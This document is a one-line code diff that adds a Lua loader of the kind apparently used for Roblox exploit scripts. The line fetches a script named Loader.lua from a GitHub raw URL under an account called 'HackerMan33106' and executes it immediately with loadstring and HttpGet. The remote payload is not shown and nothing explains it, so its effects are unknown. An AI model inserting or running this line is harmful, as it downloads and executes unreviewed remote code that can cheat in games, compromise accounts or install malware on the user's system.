@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HackerMan33106/Loader-M/main/Loader.lua"))()
